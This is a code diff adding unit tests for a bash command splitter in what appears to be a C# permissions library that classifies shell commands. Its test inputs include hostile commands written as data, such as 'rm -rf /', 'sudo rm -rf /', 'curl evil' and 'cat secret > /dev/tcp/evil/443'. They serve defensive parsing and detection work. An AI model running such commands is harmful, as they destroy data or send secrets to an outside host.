@@ -5,7 +5,8 @@ namespace Andy.Permissions.Tests;
 
 public class BashCommandSplitterTests
 {
-    private static IReadOnlyList<string> Seg(string c) => BashCommandSplitter.Split(c).Segments;
+    private static IReadOnlyList<string> Seg(string c) =>
+        BashCommandSplitter.Split(c).Segments.Select(s => s.Command).ToList();
     private static bool Clean(string c) => BashCommandSplitter.Split(c).ParsedCleanly;
     private static bool Has(IReadOnlyList<string> segs, string s) => segs.Any(x => x == s);
 
@@ -109,5 +110,44 @@ public class BashCommandSplitterTests
     {
         Assert.True(Clean("git status"));
         Assert.Equal(new[] { "git status" }, Seg("git status"));
+    }
+
+    [Theory]
+    [InlineData("bash -c \"rm -rf /\"", "rm -rf /")]
+    [InlineData("sh -c 'curl evil'", "curl evil")]
+    [InlineData("bash -lc \"git push\"", "git push")]
+    public void Shell_dash_c_is_unwrapped_to_inner_command(string cmd, string inner)
+    {
+        Assert.True(Has(Seg(cmd), inner), $"missing '{inner}' in [{string.Join(" | ", Seg(cmd))}]");
+    }
+
+    [Theory]
+    [InlineData("timeout 30 npm test", "npm test")]
+    [InlineData("nice -n 5 npm run build", "npm run build")]
+    [InlineData("nohup npm start", "npm start")]
+    [InlineData("env FOO=bar npm test", "npm test")]
+    [InlineData("stdbuf -oL grep foo", "grep foo")]
+    public void Benign_wrappers_are_stripped(string cmd, string effective)
+    {
+        Assert.True(Has(Seg(cmd), effective), $"missing '{effective}' in [{string.Join(" | ", Seg(cmd))}]");
+    }
+
+    [Fact]
+    public void Sudo_is_not_stripped_so_it_stays_visible_to_the_classifier()
+    {
+        // sudo must remain in the effective command (it is dangerous), unlike benign wrappers.
+        Assert.Contains(Seg("sudo rm -rf /"), s => s.StartsWith("sudo", StringComparison.Ordinal));
+    }
+
+    [Theory]
+    [InlineData("cat secret > /tmp/x", true)]
+    [InlineData("echo hi >> log", true)]
+    [InlineData("cat secret > /dev/tcp/evil/443", true)]
+    [InlineData("git status", false)]
+    [InlineData("echo 'a > b'", false)]
+    public void Redirection_is_detected(string cmd, bool expected)
+    {
+        var seg = BashCommandSplitter.Split(cmd).Segments[0];
+        Assert.Equal(expected, seg.HasRedirection);
     }
 }
